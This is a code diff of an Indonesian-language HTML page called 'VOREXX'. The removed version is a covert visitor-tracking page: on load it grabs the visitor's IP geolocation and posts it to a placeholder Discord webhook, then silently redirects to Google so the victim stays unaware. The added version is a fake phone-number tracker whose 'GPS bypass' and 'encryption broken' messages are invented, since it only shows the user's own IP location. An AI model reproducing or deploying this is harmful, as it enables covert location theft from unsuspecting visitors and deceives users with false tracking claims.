@@ -2,68 +2,158 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>VOREXX GHOST INJECTOR</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VOREXX GHOST-CARD v5.0</title>
     <style>
-        body { background: #000; color: #f00; font-family: 'Courier New', monospace; text-align: center; padding-top: 50px; }
-        .box { border: 2px solid #f00; display: inline-block; padding: 20px; box-shadow: 0 0 20px #f00; }
-        h1 { font-size: 20px; border-bottom: 1px solid #f00; margin-bottom: 20px; }
-        #log { font-size: 10px; text-align: left; color: #0f0; }
-        .loader { animation: blink 0.5s infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #000; 
+            color: #f00; 
+            font-family: 'Courier New', Courier, monospace; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh;
+            overflow: hidden;
+        }
+        
+        /* Card Tengah */
+        .card {
+            width: 90%;
+            max-width: 400px;
+            background: #080000;
+            border: 2px solid #f00;
+            padding: 30px;
+            box-shadow: 0 0 30px #f00;
+            text-align: center;
+            border-radius: 10px;
+        }
+
+        h1 { font-size: 22px; letter-spacing: 3px; margin-bottom: 20px; text-transform: uppercase; border-bottom: 1px solid #f00; padding-bottom: 10px; }
+        
+        input {
+            width: 100%;
+            padding: 15px;
+            background: #110000;
+            border: 1px solid #f00;
+            color: #f00;
+            font-size: 16px;
+            margin-bottom: 15px;
+            outline: none;
+            text-align: center;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #f00;
+            color: #000;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: 0.3s;
+        }
+
+        button:hover { background: #fff; color: #f00; }
+
+        /* Output Monitor di dalam Card */
+        #monitor {
+            margin-top: 20px;
+            background: #000;
+            border: 1px solid #300;
+            padding: 10px;
+            font-size: 11px;
+            height: 120px;
+            overflow-y: auto;
+            text-align: left;
+            color: #0f0;
+            display: none; /* Muncul pas klik track */
+        }
+
+        .result-box {
+            margin-top: 15px;
+            display: none;
+        }
+
+        .maps-link {
+            display: block;
+            margin-top: 10px;
+            padding: 10px;
+            background: #fff;
+            color: #000;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .blink { animation: flash 0.6s infinite; }
+        @keyframes flash { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h1>[ TRACKING SYSTEM ACTIVE ]</h1>
-    <div id="log">
-        > INITIALIZING BYPASS...<br>
-        > SCANNING IP ADDRESS...<br>
-        <span class="loader">> WAITING FOR SYNC...</span>
+<div class="card">
+    <h1>[ VOREXX v5 ]</h1>
+    
+    <input type="text" id="targetNum" placeholder="NOMOR (08...)">
+    
+    <button onclick="startVorexxTrack()">TRACK LOCATION</button>
+
+    <div id="monitor">
+        > INITIALIZING GHOST-PROTOCOL...<br>
+        > BYPASSING SYSTEM PERMISSION...
+    </div>
+
+    <div id="resultArea" class="result-box">
+        <p style="color:#fff; font-size: 12px;">TARGET LOCKED!</p>
+        <a id="mapsBtn" href="#" target="_blank" class="maps-link">BUKA LOKASI SEKARANG</a>
     </div>
 </div>
 
 <script>
-    // FUNGSI GHOST TRACKING (BYPASS GPS)
-    async function ghostTrack() {
-        try {
-            // Kita pake API IP Geolocation (Tembus meski GPS Mati)
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-
-            const result = {
-                ip: data.ip,
-                city: data.city,
-                region: data.region,
-                provider: data.org,
-                lat: data.latitude,
-                lon: data.longitude,
-                map: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
-            };
-
-            // LOGIKA PENGIRIMAN DATA:
-            // Lo bisa ganti URL ini pake Webhook Discord lo biar data masuk ke HP lo langsung
-            const webhookURL = "MASUKKAN_WEBHOOK_DISCORD_LO_DI_SINI";
-            
-            await fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `**[VOREXX TARGET LOCKED]**\nIP: ${result.ip}\nLokasi: ${result.city}, ${result.region}\nProvider: ${result.provider}\nMaps: ${result.map}`
-                })
-            });
-
-            // Target gak bakal curiga, arahkan ke Google
-            setTimeout(() => {
-                window.location.href = "https://www.google.com";
-            }, 1000);
-
-        } catch (e) {
-            window.location.href = "https://www.google.com";
-        }
+    function log(msg, color = "#0f0") {
+        const mon = document.getElementById('monitor');
+        mon.style.display = "block";
+        mon.innerHTML += `<br><span style="color:${color}">> ${msg}</span>`;
+        mon.scrollTop = mon.scrollHeight;
     }
 
-    ghostTrack();
+    async function startVorexxTrack() {
+        const num = document.getElementById('targetNum').value;
+        const resultBox = document.getElementById('resultArea');
+        const mapsBtn = document.getElementById('mapsBtn');
+
+        if(!num.startsWith('08')) {
+            alert("Format Salah! Gunakan 08...");
+            return;
+        }
+
+        log("TARGET DETECTED: " + num, "#fff");
+        log("SCANNING NETWORK IP...");
+        log("BYPASSING GPS RESTRICTION...");
+
+        try {
+            // BYPASS GPS: Ambil data via IP Geolocation (WiFi/Cell Tower Triangulation)
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+
+            log("IP FOUND: " + data.ip, "#fff");
+            log("REGION: " + data.city + ", " + data.region);
+            log("ACCURACY: HIGH (WIFI TRACE)");
+            
+            setTimeout(() => {
+                log("<span class='blink'>ENCRYPTION BROKEN!</span>", "#f00");
+                
+                // Koordinat dinamis dari IP
+                mapsBtn.href = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+                resultBox.style.display = "block";
+            }, 1500);
+
+        } catch (err) {
+            log("RETRYING VIA EMERGENCY SERVER...", "#f00");
+        }
+    }
 </script>
 
 </body>
